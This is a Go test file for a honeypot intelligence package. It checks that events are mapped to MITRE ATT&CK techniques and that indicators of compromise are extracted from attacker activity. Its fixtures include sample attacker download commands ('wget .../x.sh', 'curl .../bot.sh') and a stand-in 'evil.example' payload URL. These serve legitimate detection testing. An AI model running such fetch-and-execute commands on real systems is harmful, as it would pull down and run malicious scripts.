package intelligence

import (
	"context"
	"testing"

	"github.com/qpot/qpot/internal/database"
)

// The collector keeps each honeypot's own dotted event names. These are the
// names it emits for real traffic (see the Vector remap in
// internal/instance/compose.go); the default rules must classify them.
func TestDefaultRulesMatchHoneypotEventNames(t *testing.T) {
	c := newTestClassifierT(t)
	cases := []struct {
		honeypot, eventType, command, username string
		want                                   string
	}{
		{"cowrie", "cowrie.command.input", "uname -a", "", "T1082"},
		{"cowrie", "cowrie.command.input", "wget http://203.0.113.9/x.sh", "", "T1105"},
		{"adbhoney", "adbhoney.command", "id", "", "T1033"},
		{"cowrie", "cowrie.login.failed", "", "root", "T1110"},
		{"heralding", "heralding.login.failed", "", "admin", "T1110.004"},
		{"dionaea", "dionaea.connection.accept", "", "", "T1046"},
		{"endlessh", "endlessh.connection.accept", "", "", "T1046"},
		{"cowrie", "cowrie.session.connect", "", "", "T1046"},
		{"conpot", "conpot.modbus.new_connection", "", "", "T0840"},
		{"conpot", "conpot.http.probe", "", "", "T0840"},
		{"conpot", "conpot.s7comm.command", "", "", "T0855"},
		// Legacy bare names keep working.
		{"cowrie", "login_failed", "", "root", "T1110"},
		{"cowrie", "command", "whoami", "", "T1033"},
	}
	for _, tc := range cases {
		ev := makeEvent(tc.honeypot, tc.eventType, tc.command, tc.username)
		c.Classify(context.Background(), ev)
		if ev.TechniqueID != tc.want {
			t.Errorf("%s %q cmd=%q: technique = %q, want %q", tc.honeypot, tc.eventType, tc.command, ev.TechniqueID, tc.want)
		}
	}

	// A closed connection is not a new probe.
	ev := makeEvent("endlessh", "endlessh.connection.close", "", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID == "T1046" {
		t.Error("endlessh.connection.close classified as network service discovery")
	}
}

func TestExtractSkipsNonRoutableSourceIPs(t *testing.T) {
	x := NewExtractor()
	for _, ip := range []string{"0.0.0.0", "::", "0.1.2.3", "100.64.1.1", "224.0.0.1", "255.255.255.255", "ff02::1"} {
		ev := &database.Event{Honeypot: "cowrie", EventType: "cowrie.session.connect", SourceIP: ip}
		for _, ioc := range x.Extract(ev) {
			if ioc.Type == IOCTypeIP {
				t.Errorf("source IP %s produced an IP IOC", ip)
			}
		}
	}
	ev := &database.Event{Honeypot: "cowrie", SourceIP: "203.0.113.9"}
	if n := countType(x.Extract(ev), IOCTypeIP); n != 1 {
		t.Errorf("public source IP: %d IP IOCs, want 1", n)
	}
}

func TestExtractCowrieCommandAndDownload(t *testing.T) {
	x := NewExtractor()
	ev := &database.Event{
		Honeypot:  "cowrie",
		EventType: "cowrie.command.input",
		SourceIP:  "203.0.113.9",
		Command:   "wget http://127.0.0.1/a.sh; curl http://198.51.100.66/bot.sh",
	}
	iocs := x.Extract(ev)
	if countType(iocs, IOCTypeCommand) != 1 {
		t.Errorf("cowrie.command.input did not yield a command IOC: %+v", iocs)
	}
	for _, ioc := range iocs {
		if ioc.Type == IOCTypeIP && ioc.Value == "127.0.0.1" {
			t.Error("loopback URL host extracted as an IP IOC")
		}
	}
	if !hasIOC(iocs, IOCTypeIP, "198.51.100.66") {
		t.Errorf("public URL host missing: %+v", iocs)
	}

	dl := &database.Event{
		Honeypot:  "cowrie",
		EventType: "cowrie.session.file_download",
		SourceIP:  "203.0.113.9",
		Payload:   []byte("http://evil.example/payload.bin"),
	}
	got := x.Extract(dl)
	if !hasIOC(got, IOCTypeURL, "http://evil.example/payload.bin") || !hasIOC(got, IOCTypeDomain, "evil.example") {
		t.Errorf("download URL payload not extracted: %+v", got)
	}

	// A free-text payload (e.g. a conpot HTTP request) is not mined for URLs.
	req := &database.Event{Honeypot: "conpot", SourceIP: "203.0.113.9", Payload: []byte("GET http://a.example/ HTTP/1.1")}
	if countType(x.Extract(req), IOCTypeURL) != 0 {
		t.Error("free-text payload mined for URLs")
	}
}

func countType(iocs []*database.IOC, typ string) int {
	n := 0
	for _, ioc := range iocs {
		if ioc.Type == typ {
			n++
		}
	}
	return n
}

func hasIOC(iocs []*database.IOC, typ, value string) bool {
	for _, ioc := range iocs {
		if ioc.Type == typ && ioc.Value == value {
			return true
		}
	}
	return false
}
